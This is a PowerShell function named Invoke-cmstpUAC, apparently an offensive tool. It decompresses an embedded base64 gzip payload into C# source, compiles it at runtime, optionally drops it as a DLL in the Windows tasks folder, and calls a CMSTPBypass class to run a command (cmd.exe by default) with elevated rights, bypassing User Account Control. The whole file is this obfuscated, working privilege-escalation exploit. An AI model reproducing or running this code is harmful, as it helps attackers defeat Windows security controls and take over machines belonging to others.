function Invoke-cmstpUAC {
    [CmdletBinding()]
    Param (
        [String] $cmd = "c:\windows\system32\cmd.exe",
        [Switch] $out
    )
    $gzipB64 = "H4sIAAAAAAAAA41WW2/aSBR+318xa7WSUSyXJCXZLqUS1xQVUoRpWW0cVY494FHsGWs8BqIo/71nxpNgG8PuCzLn8p3bN2cmSwldI+cpFThuo6zwz17gnaiIxt8rggHx1pSlgvhpRdNnccIopmLKAhwdKKMI+4Iwmto3mGJO/IrFktCAbaug84wKEmN7TAXmLHEw3xAfg1WSPUTER37kpSnqT53FrPeUyO/nV1UqPMgSbRgJ0HCH/UxgMxVcgkOqsUeDBdPyBniRlfnniETYHu5IKlKzNztzQrbBkblLrJjRx8aZ4brGq/AhsbZS2JC+Q7ohnNEYipfuwjxvtNELclS0XkaiAHM0piuJjzqI4m1ZZ4K5VtvdJME0MB0stMQ8yBasZ5xBG1JHeFzaMVmt/srxqwb/u572Hsru8nUmi0oB1PjgZchAZ2+JLlheg1ly+ZFiJ8RRpHMFx5UXpfgtY1tlZL45qMrFTHC0VQT4CpW+NSnXyAAVZa6w/wVOtFHAYAQVA2hfTqgukG6DzX2Voa7yBW1DOQ6z7FnCBrMyO+0R4zHUABP6hp/yj6UHA9f4OLHWGl/1aIAjDLQ7bJlKIOFk40GPNFM1OQuTP0FXrZqDnMXS+NaLZeEzT4RwwkRZYTZsJ4kgzz6jG8wFZNIPPW4attFo3DXv2694CwyHmHv8aUA4oPVmMPA9bQJZW7vC6++ZSDJxitp7i1d2F8PUGkhq1irKddX72oSujIM8ITXo68AT3rE8V4xjzw+RufE4NAQRirQHdHzvruNMCJUTarRf2gVse46TyPOxadx0p+PReDj4tezOZ93boWEdDrLe04HuYD4iUAcBL93/dWIlmlt1TtPuvDeBaL3hcLR3Khxr1aIlJwJ3o0iuerPQuj0zrSJ6ibAci4xTVOtVQ2d9rKsnURNNrwM1RKCz/nt3j2AxrLGQTNYLA8isP3Hae1JsLjq35ebOnewJpmsRykPcbLymW1oVuR0QHvq24jgNzf3+WZ7aPxXlHmfqEVpUqnSWJ1ZKbV7QJNgseM1ZBgtFeZdAJJlDtq3RWKi1H005kaMLJqdGPjp0Y6EJXHifCRVf0KTxtlmyRC59Q50KZIIWkU4Tqvs8gcscbmX4PDsDc2UHP2foxnayh9zbnNyReyu/BXVuWSL/3A2iaCzPvjCNLMX88sIOosho3FdzBX5i8HpgLCqWrmcVLmlgIZkU7ceB1EOoI9iW7O7ES8WQcyaXmuAZ/o+ANeMoRIZYFWfVwbz0L6i8ZUqqZ2Tcwf5N4R10D4kZDllTD9qDO+/8kPjemr2T4m6w8aiPg/HtqHNht6ToboBXXhbB1QAho0h597NUsHiA4TUGKIDZkRJpIWVO/t6Cww53Mk+lA7ymZhxDdVmiV1HaqZFpTxX2uFqlULPkDOGlj48kitCH8RQV1xL6MFKYJ7JUoB8/NZtNS/6ed6QCXn2/JoPxQNta6FrB1KiUu2t8/TaZuvDpGs730QJSG7rulPicpWwlXFdf5q7bzziH583PfCKuC4tdXaCgKu7gHAqWzgqWnh6ANMvl739QvEsgPg4Uw97nYtdQSeanLK9Lv17l2uq4xs/ZbW4D9OXC2fgV+csBy/TJhEsZTqb/t+tuXwsxjtnu1ClOE3wZi4sn7/Go4YMyTOCxY8f+7qjZWpn1L+cXU/tm+M9RO6zsnufDxe3LodF+4cjLqXhQlPD5ympZ59aFBSSwLq1r6/KwF3vrpBZCun60rgDkHCBaAPKXdX0KZn0E5kLlIGFap9zD04Wcco2PRL6G+ls6/tUpgKAWoAUVN61PKvbLH78BhBVexvcNAAA=";
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    $gzipMemoryStream = [IO.MemoryStream]::new($gzipBytes);
    $gzipStream = [IO.Compression.GzipStream]::new($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress)
    $binaryMemoryStream = [IO.MemoryStream]::new()
    $gzipStream.CopyTo($binaryMemoryStream);
    $reader = [IO.StreamReader]::new($binaryMemoryStream)
    $binaryMemoryStream.Position = 0
    if ($out -eq $true) { 
        Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "c:\windows\tasks\doosey.dll"
    } else {
        Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms"
    }
    $gzipMemoryStream, $binaryMemoryStream, $reader | % {$_.Dispose()}
    if ($out -eq $false) {[CMSTPBypass]::Execute($cmd)}
}